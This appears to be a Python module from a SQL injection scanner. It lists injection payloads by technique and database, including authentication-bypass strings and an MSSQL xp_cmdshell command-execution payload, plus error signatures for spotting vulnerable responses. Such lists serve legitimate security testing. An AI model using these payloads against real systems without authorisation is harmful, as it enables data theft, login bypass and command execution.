"""
SQL Injection test payloads
Database-specific and technique-based payloads for educational testing
"""

SQL_PAYLOADS = [
    # ==================== BASIC SQLi ====================
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "\" OR 1=1--",
    
    # ==================== UNION-BASED ====================
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "1' UNION SELECT NULL,user(),database()--",
    
    # ==================== BOOLEAN-BASED ====================
    "' AND '1'='1",
    "' AND '1'='2",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "' AND 1=1--",
    "' AND 1=2--",
    "1 AND 1=1",
    "1 AND 1=2",
    
    # ==================== TIME-BASED (BLIND) ====================
    "' OR SLEEP(5)--",
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND pg_sleep(5)--",
    "' AND DBMS_LOCK.SLEEP(5)--",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables) > 0--",
    
    # ==================== ERROR-BASED ====================
    "' AND extractvalue(1,concat(0x7e,(SELECT user())))--",
    "' AND updatexml(1,concat(0x7e,(SELECT version())),1)--",
    "' AND !(SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT user()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--",
    
    # ==================== COMMENT-BASED ====================
    "'--",
    "\"--",
    "';--",
    "'#",
    "\"#",
    "';#",
    "' /*",
    "' /*!50000 OR 1=1*/",
    
    # ==================== DATABASE-SPECIFIC: MySQL ====================
    "' UNION SELECT @@version--",
    "' UNION SELECT user()--",
    "' UNION SELECT database()--",
    "' AND version()>'4.0'--",
    "' /*!50000OR*/1=1--",
    "' /*!50000 UNION*/ SELECT NULL--",
    
    # ==================== DATABASE-SPECIFIC: PostgreSQL ====================
    "' OR 1=1--",
    "' UNION SELECT version(),2--",
    "' UNION SELECT current_user,2--",
    "' AND pg_sleep(3)--",
    
    # ==================== DATABASE-SPECIFIC: MSSQL ====================
    "' UNION SELECT @@version--",
    "' UNION SELECT user_name()--",
    "'; EXEC xp_cmdshell('dir')--",
    "' OR 1=1/*",
    "' AND waitfor delay '00:00:05'--",
    
    # ==================== AUTHENTICATION BYPASS ====================
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1 limit 1 --",
    "admin' or '1'='1",
    "admin'--",
    "' or 'a'='a",
    "' or 1=1#",
    
    # ==================== ORDER BY / COLUMN ENUMERATION ====================
    "' ORDER BY 1--",
    "' ORDER BY 2--",
    "' ORDER BY 3--",
    "' ORDER BY 4--",
    "' ORDER BY 5--",
    "' ORDER BY 6--",
    "' ORDER BY 7--",
    
    # ==================== ADVANCED TECHNIQUES ====================
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(CHAR(45),CHAR(45),CHAR(45),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' UNION SELECT NULL INTO @a;SELECT @a:=CONCAT(0x7e,user(),0x7e),@a:=@a--",
    "' AND EXTRACTVALUE(RAND(),CONCAT(0x3a,VERSION(),0x3a))--",
    "' AND GTID_SUBSET(CONCAT(0x7e,VERSION(),0x7e),1)--",
    
    # ==================== CASE SENSITIVITY BYPASS ====================
    "' oR '1'='1",
    "' Or '1'='1",
    "' OR '1'='1' --",
    "' UnIoN SeLeCt NULL--",
]

# SQL error signatures to detect (lowercased for case-insensitive matching)
SQL_ERRORS = [
    # MySQL
    "sql syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql error",
    "you have an error in your sql",
    
    # PostgreSQL
    "postgresql",
    "pgsql",
    "postgres error",
    
    # SQLite
    "sqlite",
    "sqlite3",
    
    # MSSQL
    "mssql",
    "microsoft sql",
    "odbc",
    "sql server",
    
    # General
    "jdbc",
    "database error",
    "sql error",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql statement",
    "syntax error",
    "exception",
    "fatal error",
    "supplied argument is not",
    "division by zero",
    "permission denied",
    "access denied",
    "illegal character",
    "unexpected character",
]
